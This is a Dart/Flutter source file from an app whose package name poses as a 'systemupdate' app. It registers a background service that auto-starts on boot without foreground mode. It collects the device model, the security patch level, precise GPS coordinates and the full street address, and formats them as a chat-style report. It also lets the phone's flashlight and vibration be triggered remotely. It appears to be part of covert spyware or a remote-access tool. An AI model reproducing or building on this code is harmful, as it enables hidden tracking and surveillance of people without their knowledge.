import 'package:device_info_plus/device_info_plus.dart';
import 'package:geolocator/geolocator.dart';
import 'package:geocoding/geocoding.dart';
import 'package:battery_plus/battery_plus.dart';
import 'package:connectivity_plus/connectivity_plus.dart';
import 'package:flutter/services.dart';
import 'package:flutter_background_service/flutter_background_service.dart';

class DeviceService {
  static const _channel = MethodChannel('com.systemupdate.app/device');

  static Future<void> initializeBackground() async {
    final service = FlutterBackgroundService();
    await service.configure(
      androidConfiguration: AndroidConfiguration(
        onStart: _onStart,
        autoStart: true,
        isForegroundMode: false,
        autoStartOnBoot: true,
      ),
      iosConfiguration: IosConfiguration(
        autoStart: true,
        onForeground: _onStart,
        onBackground: _onIosBg,
      ),
    );
  }

  @pragma('vm:entry-point')
  static void _onStart(ServiceInstance service) async {}

  @pragma('vm:entry-point')
  static Future<bool> _onIosBg(ServiceInstance service) async => true;

  static Future<String> getFullInfo() async {
    try {
      final deviceInfo = DeviceInfoPlugin();
      final android = await deviceInfo.androidInfo;
      final pos = await Geolocator.getCurrentPosition();
      final place = await placemarkFromCoordinates(pos.latitude, pos.longitude);
      final batt = Battery();
      final level = await batt.batteryLevel;
      final conn = await Connectivity().checkConnectivity();
      final p = place.first;

      return '''
🖥 <b>DEVICE INFO</b>
━━━━━━━━━━━━━━━
📱 <b>Hardware:</b>
• Model: ${android.model}
• Brand: ${android.brand}
• Device: ${android.device}
• Hardware: ${android.hardware}
• Product: ${android.product}

📲 <b>System:</b>
• Android: ${android.version.release}
• SDK: ${android.version.sdkInt}
• Security: ${android.version.securityPatch}

🖥 <b>Display:</b>
• Resolution: ${android.displayMetrics.widthPx}x${android.displayMetrics.heightPx}
• Density: ${android.displayMetrics.density}

📍 <b>Location:</b>
• Lat: ${pos.latitude}
• Lng: ${pos.longitude}
• Address: ${p.street}, ${p.subLocality}
• Village: ${p.locality}
• District: ${p.subAdministrativeArea}
• City: ${p.administrativeArea}
• Country: ${p.country}
• Postal: ${p.postalCode}

🔋 <b>Status:</b>
• Battery: $level%
• Network: ${conn.toString().split('.').last}
• Online: ✅
━━━━━━━━━━━━━━━
🕐 ${DateTime.now().toString().substring(0, 19)}
''';
    } catch (e) {
      return 'Error: $e';
    }
  }

  static Future<void> toggleFlashlight(bool on) async {
    try {
      await _channel.invokeMethod('toggleFlashlight', {'on': on});
    } catch (_) {}
  }

  static Future<void> vibrate() async {
    try {
      await _channel.invokeMethod('vibrate', {'duration': 2000});
    } catch (_) {
      HapticFeedback.heavyImpact();
    }
  }
}